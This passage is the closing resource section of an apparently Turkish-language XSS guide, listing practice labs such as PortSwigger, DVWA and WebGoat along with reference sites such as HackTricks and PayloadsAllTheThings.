| **PortSwigger Web Academy** | [portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting) | En kapsamlı ücretsiz XSS lab'ı |
| **DVWA** | [github.com/digininja/DVWA](https://github.com/digininja/DVWA) | Yerel kurulum, tüm XSS türleri |
| **XSS Game (Google)** | [xss-game.appspot.com](https://xss-game.appspot.com) | 6 seviyeli XSS puzzle |
| **PentesterLab** | [pentesterlab.com](https://pentesterlab.com) | Gerçekçi web uygulama lab'ları |
| **HackTheBox** | [hackthebox.com](https://hackthebox.com) | CTF tarzı challenge'lar |
| **TryHackMe** | [tryhackme.com](https://tryhackme.com) | Yeni başlayanlar için |
| **BWAPP** | [bwapp.hakhippo.com](http://bwapp.hakhippo.com) | 100+ zafiyet içeren uygulama |
| **WebGoat** | [owasp.org/WebGoat](https://owasp.org/www-project-webgoat/) | OWASP'ın eğitim uygulaması |
| **alert(1) to win** | [alf.nu/alert1](https://alf.nu/alert1) | CSP bypass challenge'ları |

---

## Faydalı Kaynaklar

| Kaynak | Açıklama |
|--------|----------|
| [HackTricks — XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting) | Kapsamlı XSS teknik referans |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) | Dev payload koleksiyonu |
| [PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | Resmi XSS cheatsheet |
| [XSS Hunter](https://xsshunter.trufflesecurity.com/) | Blind XSS tespit platformu |
| [CSP Evaluator](https://csp-evaluator.withgoogle.com/) | CSP analiz aracı |

---

> Metodoloji gerçek bug bounty görevlerinden derlenmiştir.  
> Her teknik gerçek hedeflere karşı test edilmiştir.

---
